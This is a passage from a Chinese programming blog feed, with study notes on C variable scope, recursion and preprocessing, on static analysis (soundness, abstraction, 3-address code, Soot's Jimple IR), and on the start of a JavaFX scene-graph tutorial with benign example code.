d));</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：<br>a VS b: 32<br>a VS c: -31<br>a VS d: 0</p>
<h2 id="C语言函数"><a href="#C语言函数" class="headerlink" title="C语言函数"></a>C语言函数</h2><h3 id="库函数和自定义函数"><a href="#库函数和自定义函数" class="headerlink" title="库函数和自定义函数"></a>库函数和自定义函数</h3><p>C语言在发布时已经为我们封装好了很多函数，它们被分门别类地放到了不同的头文件中（暂时先这样认为），使用函数时引入对应的头文件即可。这些函数都是专家编写的，执行效率极高，并且考虑到了各种边界情况，各位读者请放心使用。</p>
<p>C语言自带的函数称为库函数（Library Function）。库（Library）是编程中的一个基本概念，可以简单地认为它是一系列函数的集合，在磁盘上往往是一个文件夹。C语言自带的库称为标准库（Standard Library），其他公司或个人开发的库称为第三方库（Third-Party Library）。</p>
<h3 id="C语言全局变量和局部变量"><a href="#C语言全局变量和局部变量" class="headerlink" title="C语言全局变量和局部变量"></a>C语言全局变量和局部变量</h3><p>形参变量要等到函数被调用时才分配内存，调用结束后立即释放内存。这说明形参变量的作用域非常有限，只能在函数内部使用，离开该函数就无效了。所谓作用域（Scope），就是变量的有效范围。</p>
<p>不仅对于形参变量，C语言中所有的变量都有自己的作用域。决定变量作用域的是变量的定义位置。</p>
<h4 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h4><p>定义在函数内部的变量称为<strong>局部变量（Local Variable）</strong>，它的作用域仅限于函数内部， 离开该函数后就是无效的，再使用就会报错。例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f1</span><span class="params">(<span class="type">int</span> a)</span>&#123;</span><br><span class="line">    <span class="type">int</span> b,c;  <span class="comment">//a,b,c仅在函数f1()内有效</span></span><br><span class="line">    <span class="keyword">return</span> a+b+c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> m,n;  <span class="comment">//m,n仅在函数main()内有效</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><p>在 main 函数中定义的变量也是局部变量，只能在 main 函数中使用；同时，main 函数中也不能使用其它函数中定义的变量。main 函数也是一个函数，与其它函数地位平等。</p>
</li>
<li><p>形参变量、在函数体内定义的变量都是局部变量。实参给形参传值的过程也就是给局部变量赋值的过程。</p>
</li>
<li><p>可以在不同的函数中使用相同的变量名，它们表示不同的数据，分配不同的内存，互不干扰，也不会发生混淆。</p>
</li>
<li><p>在语句块中也可定义变量，它的作用域只限于当前语句块。</p>
</li>
</ol>
<h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><p>在所有函数外部定义的变量称为<strong>全局变量（Global Variable）</strong>，它的作用域默认是整个程序，也就是所有的源文件，包括 .c 和 .h 文件。例如：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a, b;  <span class="comment">//全局变量</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">float</span> x,y;  <span class="comment">//全局变量</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func2</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//<span class="doctag">TODO:</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>a、b、x、y 都是在函数外部定义的全局变量。C语言代码是从前往后依次执行的，由于 x、y 定义在函数 func1() 之后，所以在 func1() 内无效；而 a、b 定义在源程序的开头，所以在 func1()、func2() 和 main() 内都有效。</p>
<h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>所谓<strong>作用域（Scope）</strong>，就是变量的有效范围，就是变量可以在哪个范围以内使用。有些变量可以在所有代码文件中使用，有些变量只能在当前的文件中使用，有些变量只能在函数内部使用，有些变量只能在 <a href="https://c.biancheng.net/view/172.html">for 循环</a>内部使用。</p>
<p>变量的作用域由变量的定义位置决定，在不同位置定义的变量，它的作用域是不一样的。</p>
<blockquote>
<p>全局变量的默认作用域是整个程序，也就是所有的代码文件，包括源文件（<code>.c</code>文件）和头文件（<code>.h</code>文件）。如果给全局变量加上 <strong>static</strong> 关键字，它的作用域就变成了当前文件，在其它文件中就无效了。</p>
</blockquote>
<p><strong>重点：</strong></p>
<p><strong>在一个函数内部修改全局变量的值会影响其它函数，全局变量的值在函数内部被修改后并不会自动恢复，它会一直保留该值，直到下次被修改。</strong></p>
<img src="/image/image-20240218162253460.png" alt="image-20240218162253460" style="zoom: 67%;" />

<p>可以看到两个变量a的地址是不一样的。</p>
<p>全局变量也是变量，变量只能保存一份数据，一旦数据被修改了，原来的数据就被冲刷掉了，再也无法恢复了，所以不管是全局变量还是局部变量，一旦它的值被修改，这种影响都会一直持续下去，直到再次被修改。</p>
<h4 id="变量命名"><a href="#变量命名" class="headerlink" title="变量命名"></a>变量命名</h4><p>C语言规定，在同一个作用域中不能出现两个名字相同的变量，否则会产生命名冲突；但是在不同的作用域中，允许出现名字相同的变量，它们的作用范围不同，彼此之间不会产生冲突。这句话有两层含义：</p>
<ul>
<li>不同函数内部可以出现同名的变量，不同函数是不同的局部作用域；</li>
<li>函数内部和外部可以出现同名的变量，函数内部是局部作用域，函数外部是全局作用域。</li>
</ul>
<h3 id="块级变量"><a href="#块级变量" class="headerlink" title="块级变量"></a>块级变量</h3><p>所谓代码块，就是由<code>&#123; &#125;</code>包围起来的代码。代码块在C语言中随处可见，例如函数体、选择结构、循环结构等。</p>
<p>C语言允许在代码块内部定义变量，这样的变量具有块级作用域；换句话说，在代码块内部定义的变量只能在代码块内部使用，出了代码块就无效了。</p>
<h4 id="for循环内定义变量"><a href="#for循环内定义变量" class="headerlink" title="for循环内定义变量"></a>for循环内定义变量</h4><p>在 for 循环条件里面定义新变量，这样的变量也是块级变量，它的作用域仅限于 for 循环内部。</p>
<p>如果一个变量只在 for 循环内部使用，就可以将它定义在循环条件里面，这样做可以避免在函数开头定义过多的变量，使得代码结构更加清晰。</p>
<h4 id="单独的代码块"><a href="#单独的代码块" class="headerlink" title="单独的代码块"></a>单独的代码块</h4><p>C语言还允许出现单独的代码块，它也是一个作用域。请看下面的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">22</span>;  <span class="comment">//编号①</span></span><br><span class="line">    <span class="comment">//由&#123; &#125;包围的代码块</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">40</span>;  <span class="comment">//编号②</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;block n: %d\n&quot;</span>, n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main n: %d\n&quot;</span>, n);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里有两个 n，它们位于不同的作用域，不会产生命名冲突。{ } 的作用域比 main() 更小，{ } 内部的 printf() 使用的是编号为②的 n，main() 内部的 printf() 使用的是编号为①的 n。</p>
<h4 id="再谈作用域"><a href="#再谈作用域" class="headerlink" title="再谈作用域"></a>再谈作用域</h4><p>每个C语言程序都包含了多个作用域，不同的作用域中可以出现同名的变量，C语言会按照从小到大的顺序、一层一层地去父级作用域中查找变量，如果在最顶层的全局作用域中还未找到这个变量，那么就会报错。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> m = <span class="number">13</span>;</span><br><span class="line"><span class="type">int</span> n = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">20</span>;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">822</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;block1 n: %d\n&quot;</span>, n);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func1 n: %d\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func2</span><span class="params">(<span class="type">int</span> n)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">5</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;if m: %d\n&quot;</span>, m);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="type">int</span> n = i % <span class="number">4</span>;</span><br><span class="line">            <span class="keyword">if</span>(n&lt;<span class="number">2</span> &amp;&amp; n&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;else m: %d\n&quot;</span>, m);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func2 n: %d\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">func3</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;func3 n: %d\n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">30</span>;</span><br><span class="line">    func1();</span><br><span class="line">    func2(n);</span><br><span class="line">    func3();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main n: %d\n&quot;</span>, n);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>作用域示意图如下：</p>
<img src="/image/1-1Z1031306123V.jpg" alt="C语言作用域示意图" style="zoom:50%;" />

<h3 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h3><p>一个函数在它的函数体内调用它自身称为<strong>递归调用</strong>，这种函数称为<strong>递归函数</strong>。执行递归函数将反复调用其自身，每调用一次就进入新的一层，当最内层的函数执行完毕后，再一层一层地由里到外退出。</p>
<h4 id="求阶乘"><a href="#求阶乘" class="headerlink" title="求阶乘"></a>求阶乘</h4><p><img src="/image/1310025941-0.gif" alt="img"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">//求n的阶乘</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">factorial</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span> || n == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> factorial(n - <span class="number">1</span>) * n;  <span class="comment">// 递归调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input a number: &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Factorial(%d) = %ld\n&quot;</span>, a, factorial(a));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>factorial() 就是一个典型的递归函数。调用 factorial() 后即进入函数体，只有当 n&#x3D;&#x3D;0 或 n&#x3D;&#x3D;1 时函数才会执行结束，否则就一直调用它自身。</p>
<p>由于每次调用的实参为 n-1，即把 n-1 的值赋给形参 n，所以每次递归实参的值都减 1，直到最后 n-1 的值为 1 时再作递归调用，形参 n 的值也为1，递归就终止了，会逐层退出。</p>
<p>要想理解递归函数，重点是理解它是如何逐层进入，又是如何逐层退出的，下面我们以 5! 为例进行讲解。</p>
<h5 id="递归的进入"><a href="#递归的进入" class="headerlink" title="递归的进入"></a>递归的进入</h5><ol>
<li>首先输入5，此时n不等于0或1，进入else分支后return了一个自身n-1，此时进入到factorial(4)，必须先调用 factorial(4)，并暂停其他操作。换句话说，在得到 factorial(4) 的结果之前，不能进行其他操作。这就是第一次递归。</li>
<li>继续进入else分支，直到第五次，factorial(1)时n的值为1，此时直接return 1，结束递归</li>
</ol>
<img src="/image/image-20240218164623194.png" alt="image-20240218164623194" style="zoom:67%;" />

<h5 id="递归的退出"><a href="#递归的退出" class="headerlink" title="递归的退出"></a>递归的退出</h5><ol>
<li>n 的值为 1 时达到最内层，此时 return 出去的结果为 1，也即 factorial(1) 的调用结果为 1。</li>
<li>有了 factorial(1) 的结果，就可以返回上一层计算<code>factorial(1) * 2</code>的值了。此时得到的值为 2，return 出去的结果也为 2，也即 factorial(2) 的调用结果为 2。</li>
<li>以此类推，当得到 factorial(4) 的调用结果后，就可以返回最顶层。经计算，factorial(4) 的结果为 24，那么表达式<code>factorial(4) * 5</code>的结果为 120，此时 return 得到的结果也为 120，也即 factorial(5) 的调用结果为 120，这样就得到了 5! 的值。</li>
</ol>
<img src="/image/image-20240218164824215.png" alt="image-20240218164824215" style="zoom:67%;" />

<h4 id="递归的条件"><a href="#递归的条件" class="headerlink" title="递归的条件"></a>递归的条件</h4><p>每一个递归函数都应该只进行有限次的递归调用，否则它就会进入死胡同，永远也不能退出了，这样的程序是没有意义的。</p>
<p>要想让递归函数逐层进入再逐层退出，需要解决两个方面的问题：</p>
<ul>
<li>存在限制条件，当符合这个条件时递归便不再继续。对于 factorial()，当形参 n 等于 0 或 1 时，递归就结束了。</li>
<li>每次递归调用之后越来越接近这个限制条件。对于 factorial()，每次递归调用的实参为 n - 1，这会使得形参 n 的值逐渐减小，越来越趋近于 1 或 0。</li>
</ul>
<h2 id="C语言预处理命令"><a href="#C语言预处理命令" class="headerlink" title="C语言预处理命令"></a>C语言预处理命令</h2><h3 id="预处理命令是什么"><a href="#预处理命令是什么" class="headerlink" title="预处理命令是什么"></a>预处理命令是什么</h3><p>使用库函数之前，应该用<code>#include</code>引入对应的头文件。这种以<code>#</code>号开头的命令称为预处理命令。</p>
<p>C语言源文件要经过编译、链接才能生成可执行程序：</p>
<ol>
<li>编译（Compile）会将源文件（<code>.c</code>文件）转换为目标文件。对于 VC&#x2F;VS，目标文件后缀为<code>.obj</code>；对于<a href="https://c.biancheng.net/gcc/">GCC</a>，目标文件后缀为<code>.o</code>。</li>
</ol>
<blockquote>
<p>编译是针对单个源文件的，一次编译操作只能编译一个源文件，如果程序中有多个源文件，就需要多次编译操作。</p>
</blockquote>
<ol start="2">
<li>链接（Link）是针对多个文件的，它会将编译生成的多个目标文件以及系统中的库、组件等合并成一个可执行程序。</li>
</ol>
<p>在编译之前对源文件进行简单加工的过程，就称为<strong>预处理</strong>（即预先处理、提前处理）。</p>
<p>预处理主要是处理以<code>#</code>开头的命令，例如<code>#include &lt;stdio.h&gt;</code>等。预处理命令要放在所有函数之外，而且一般都放在源文件的前面。</p>
<h1 id="软件分析"><a href="#软件分析" class="headerlink" title="软件分析"></a>软件分析</h1><h2 id="Introduce"><a href="#Introduce" class="headerlink" title="Introduce"></a>Introduce</h2><h3 id="可靠性的必要性（soundness）"><a href="#可靠性的必要性（soundness）" class="headerlink" title="可靠性的必要性（soundness）"></a>可靠性的必要性（soundness）</h3><img src="/image/image-20240129111441691.png" alt="image-20240129111441691" style="zoom:80%;" />

<p>如果只考虑B路径是sound，但是需要考虑B、C两条路径（B强转B没问题但如果走了路径C，C强转B就会报错）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//说明B和C是A的接口子类，a是A的一个实例</span></span><br><span class="line"><span class="type">B</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">B</span>();         <span class="type">C</span> <span class="variable">c</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C</span>();</span><br><span class="line">a.fld = b;              a.fld = c;</span><br><span class="line">    \                      /</span><br><span class="line">     \                    /</span><br><span class="line">      \                  /</span><br><span class="line">        <span class="type">B</span> <span class="variable">b2</span> <span class="operator">=</span> (B)a.fld;</span><br></pre></td></tr></table></figure>

<p>我们想知道第7行的cast（类型转换）是否safe：</p>
<ul>
<li>Unsound ：只考虑单一的路径，如果只考虑左边路径，是没问题的，但是如果只考虑右边的路径，会产生运行时异常。</li>
<li>Sound（全面考虑）：对于所有可能的路径都进行考虑。</li>
</ul>
<p>所有的静态分析都是在追求Sound，可以牺牲精度。</p>
<h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(input)</span><br><span class="line">&#123;</span><br><span class="line">  x = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">eles</span><br><span class="line">&#123;</span><br><span class="line">  x = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">-&gt; x = ?</span><br></pre></td></tr></table></figure>

<p>静态分析可以得到两种结论：</p>
<ol>
<li>input为真时，x为1；input为假时，x为0. 【Sound，precise，expensive（慢）】</li>
<li>x为1或0 【Sound，imprecise，cheap（快）】</li>
</ol>
<p>上述两种结论都已经跑完了所有的路径了，所以可以认为是Sound的。</p>
<p><strong>在静态分析中还有一种看法是：可以认为Sound的就是正确的。</strong></p>
<p>譬如，如果我们说x&#x3D;0，1，2，3，4，5。这显然对于x的值有错误，但是对于真正的值0和1都包含在内了，根据Sound的定义，我们可以说这个结论是Sound的，也就是这个结论在静态分析的角度来说是正确的。</p>
<p>如果说x &#x3D; -1，1，2，3，4。 虽然只和上面的结论相差一个0，但是0是我们在某一路径下的情况，所以并没有包含真正的值，这就不是Sound的，对于静态分析而言，这也就不是正确的。</p>
<h3 id="Static-Analysis-Abstraction-Overapproximation"><a href="#Static-Analysis-Abstraction-Overapproximation" class="headerlink" title="Static Analysis &#x3D; Abstraction + Overapproximation"></a>Static Analysis &#x3D; Abstraction + Overapproximation</h3><h4 id="抽象（Abstraction）"><a href="#抽象（Abstraction）" class="headerlink" title="抽象（Abstraction）"></a>抽象（Abstraction）</h4><p>Determine the sign（+ - 0 top bottom ）of all the variables of a given program.</p>
<p>正数就是+， 负数就是-，零就是0， 不确定是什么就是top（unknown），错误就是bottom（undefined）</p>
<p>抽象就是将Concrete Domain中的值向Abstract Domain做一个映射</p>
<img src="/image/image-20240129113358291.png" alt="image-20240129113358291" style="zoom: 67%;" />

<h4 id="Overapproximate：Transfer-Function（过度近似：函数转化）"><a href="#Overapproximate：Transfer-Function（过度近似：函数转化）" class="headerlink" title="Overapproximate：Transfer Function（过度近似：函数转化）"></a>Overapproximate：Transfer Function（过度近似：函数转化）</h4><p>转换函数定义了如何计算抽象值，它是被我们分析的问题和语义共同定义的。</p>
<p>这些运算法则在一定程度上遵循了数学中的法则：如负负得正、负正为负，但也会有一些不同</p>
<p>正数和负数相加为top（unknown），除以0为bottom（undefined）</p>
<img src="/image/image-20240129113750511.png" alt="image-20240129113750511" style="zoom:67%;" />

<img src="/image/image-20240129114056214.png" alt="image-20240129114056214" style="zoom: 67%;" />

<p>其中①是除0报错，②是负数索引报错，都是有用的，但是③中a可正可负，有可能正常有可能负索引报错，可能为误报</p>
<h4 id="Overapproximate：Control-Flow（控制流）"><a href="#Overapproximate：Control-Flow（控制流）" class="headerlink" title="Overapproximate：Control Flow（控制流）"></a>Overapproximate：Control Flow（控制流）</h4><img src="/image/image-20240129114737667.png" alt="image-20240129114737667" style="zoom: 67%;" />

<p>对于分支的汇聚的点，都要进行merge（合并），进行抽象。</p>
<p>无法枚举所有的分支，所以flow- merging被使用在大多数的静态分析中 。</p>
<h2 id="Intermediate-Representation（IR）"><a href="#Intermediate-Representation（IR）" class="headerlink" title="Intermediate Representation（IR）"></a>Intermediate Representation（IR）</h2><h3 id="Compiler（编译器）"><a href="#Compiler（编译器）" class="headerlink" title="Compiler（编译器）"></a>Compiler（编译器）</h3><img src="/image/image-20240129151500527.png" alt="image-20240129151500527" style="zoom:67%;" />

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">源码 -&gt; Scanner(词法分析) -&gt; Tokens -&gt; Parser(语法分析) -&gt; AST -&gt; Type Checker(语义分析) -&gt; Decorated AST -&gt; Translator(后续优化) -&gt; IR&#123;静态分析&#125; -&gt; Code Generator -&gt; Machine Code</span><br></pre></td></tr></table></figure>

<h3 id="AST-vs-IR"><a href="#AST-vs-IR" class="headerlink" title="AST vs. IR"></a>AST vs. IR</h3><img src="/image/image-20240129153011938.png" alt="image-20240129153011938" style="zoom:67%;" />

<p><strong>AST</strong>：</p>
<ul>
<li>高级语法结构</li>
<li>通常依赖于语言</li>
<li>适用于快速类型检查</li>
<li>缺乏控制流信息</li>
</ul>
<p><strong>IR</strong>：</p>
<ul>
<li>低级且接近机器代码</li>
<li>通常与语言无关</li>
<li>紧凑均匀</li>
<li>包含控制流信息</li>
<li>通常被视为静态分析的基础</li>
</ul>
<h3 id="3-Address-Code（3AC）"><a href="#3-Address-Code（3AC）" class="headerlink" title="3-Address Code（3AC）"></a>3-Address Code（3AC）</h3><img src="/image/image-20240129153630416.png" alt="image-20240129153630416" style="zoom:67%;" />

<p>指令的右侧最多有一个运算符。</p>
<p>3地址可以是以下三种地址之一：</p>
<ul>
<li>Name（变量）</li>
<li>Constant（常量）</li>
<li>Compiler-generated remporary（编译器自动生成的临时变量）</li>
</ul>
<h3 id="常见的3AC表"><a href="#常见的3AC表" class="headerlink" title="常见的3AC表"></a>常见的3AC表</h3><img src="/image/image-20240129154003216.png" alt="image-20240129154003216" style="zoom:67%;" />

<ul>
<li>x, y, z：地址值</li>
<li>bop：二元运算符</li>
<li>uop：一元运算符（取反等）</li>
<li>L：程序跳转标签</li>
<li>rop：比较符号</li>
<li>goto L：无条件跳转</li>
<li>if … goto L：条件跳转</li>
</ul>
<h3 id="Soot-and-Its-IR：Jimple"><a href="#Soot-and-Its-IR：Jimple" class="headerlink" title="Soot and Its IR：Jimple"></a>Soot and Its IR：Jimple</h3><h4 id="For-Loop"><a href="#For-Loop" class="headerlink" title="For Loop"></a>For Loop</h4><img src="/image/image-20240129161514875.png" alt="image-20240129161514875" style="zoom:67%;" />

<h4 id="Do-While-Loop"><a href="#Do-While-Loop" class="headerlink" title="Do-While Loop"></a>Do-While Loop</h4><img src="/image/image-20240129162058436.png" alt="image-20240129162058436" style="zoom:67%;" />

<img src="/image/image-20240129164459828.png" alt="image-20240129164459828" style="zoom:67%;" />

<ul>
<li>r0：命令行参数</li>
<li>r1：整型数组</li>
<li>i1：变量i</li>
<li>$i0：用于记录变量i值的临时变量</li>
</ul>
<h4 id="Method-Call"><a href="#Method-Call" class="headerlink" title="Method Call"></a>Method Call</h4><img src="/image/image-20240129170933371.png" alt="image-20240129170933371" style="zoom:67%;" />

<ul>
<li>首先前三行声明了一些变量和类型</li>
<li>将当前类所在的对象赋值给了r0（也就是this）</li>
<li>r1和r2分别拿到para1和para2的值</li>
<li>new了一个StringBuilder对象r3作为String处理的临时变量（java的语法特性）</li>
<li>specialinvoke：调用constructor、调用父类的方法、调用私有方法</li>
<li>然后通过三个append处理了三个字符串，toString转成字符串，然后return</li>
</ul>
]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>一些关于JavaFX的记录</title>
    <url>/2024/05/03/%E4%B8%80%E4%BA%9B%E5%85%B3%E4%BA%8EJavaFX%E7%9A%84%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p>下载对应版本JavaFX，解压出来如下：<br><img src="/image/Pasted image 20240429164508.png" alt="20240429164508.png" /><br>bin目录下所有dll放入jdk的bin目录，lib目录下的所有jar包添加进项目库，src为source源。</p>
<h1 id="Scene图"><a href="#Scene图" class="headerlink" title="Scene图"></a>Scene图</h1><img src="/image/Pasted image 20240503162825.png" alt="20240503162825.png" />
## 概述
Scene图是一种树形数据结构，它排列（和分组）图形对象以便于逻辑表示。 它还允许图形引擎以最有效的方式渲染对象， 完全或部分跳过在最终图像中看不到的对象。 下图显示了JavaFX场景图架构的一个示例。
<img src="/image/Pasted image 20240429164815.png" alt="20240429164815.png" />
在架构的最顶端有一个`Stage`。 `Stage`是原生操作系统窗口的JavaFX表示。 在任何给定的时间，阶段可以有一个单一的`Scene`连接到它。 场景是JavaFX场景图的容器。
JavaFX `Stage`图中的所有元素都表示为`Node`对象。 节点有三种类型：根、分支和叶。 根节点是唯一没有父节点的节点 直接包含在一个场景中，如上图所示。 分支和叶节点之间的区别在于叶节点没有子节点。
在scene图中，父节点的许多属性由子节点共享。 例如，应用于父节点的转换或事件也将递归地应用于其子节点。 因此，可以将复杂的节点层次结构视为单个节点，以简化编程模型。 我们将在后面的章节中探索转换和事件。
一个"Hello World" scene图的例子可以在下图中看到。
<img src="/image/Pasted image 20240429224324.png" alt="20240429224324.png" />
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Parent;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.StackPane;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.text.Text;  </span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> Parent <span class="title function_">createContent</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StackPane</span>(<span class="keyword">new</span> <span class="title class_">Text</span>(<span class="string">&quot;Hello World&quot;</span>));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">(Stage stage)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        stage.setScene(<span class="keyword">new</span> <span class="title class_">Scene</span>(createContent(), <span class="number">300</span>, <span class="number">300</span>));  </span><br><span class="line">        stage.show();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        launch(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
运行结果如下：
<img src="/image/Pasted image 20240429224453.png" alt="20240429224453.png" />
> 一个节点最多可以有1个父节点。
> "活动"（附加到当前可见场景）场景图中的节点只能从JavaFX应用程序线程修改。

<h2 id="Transformations"><a href="#Transformations" class="headerlink" title="Transformations"></a>Transformations</h2><p>下面将演示3种最常见的转换。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Parent;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.layout.Pane;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.paint.Color;  </span><br><span class="line"><span class="keyword">import</span> javafx.scene.shape.Rectangle;  </span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformApp</span> <span class="keyword">extends</span> <span class="title class_">Application</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">private</span> Parent <span class="title function_">createContent</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="type">Rectangle</span> <span class="variable">box</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Rectangle</span>(<span class="number">100</span>, <span 